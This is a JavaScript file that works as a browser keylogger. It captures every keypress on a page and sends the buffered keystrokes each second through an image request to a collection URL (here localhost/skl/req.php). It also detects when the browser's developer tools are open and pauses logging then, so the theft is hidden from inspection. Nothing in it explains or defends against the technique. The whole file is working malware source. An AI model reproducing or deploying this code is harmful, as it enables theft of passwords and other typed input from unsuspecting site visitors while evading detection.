let str = '';
const threshold = 160;
const URL = 'http://localhost/skl/req.php?c=';
const emitEvent = state => window.dispatchEvent(new CustomEvent('devtoolschange', {detail: {open: state}}));
const record = ({keyCode, charCode, which}) => str += encodeURIComponent(String.fromCharCode(keyCode || charCode || which));

setInterval(() => {
	if(str.length) {
		new Image().src = `${URL}${str}`;
		str = '';
	}
}, 1000);

window.addEventListener('devtoolschange', ({detail}) => {
	if(detail.open) {
		document.removeEventListener('keypress', record)
	} else {
		document.addEventListener('keypress', record);
	}
});

(function () {
	'use strict';
	let devToolsOpened = false;
	
	setInterval(() => {
		let widthThreshold = window.outerWidth - window.innerWidth > threshold;
		let heightThreshold = window.outerHeight - window.innerHeight > threshold;

		if(!(heightThreshold && widthThreshold) && ((window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized) || widthThreshold || heightThreshold)) {
			!devToolsOpened && emitEvent(true);
			devToolsOpened = true;
		} else {
			!devToolsOpened && emitEvent(false);
			devToolsOpened = false;
		}
	}, 500);

	if(typeof module !== 'undefined' && module.exports) {
		module.exports = devToolsOpened;
	} else {
		window.devToolsOpened = devToolsOpened;
	}
})();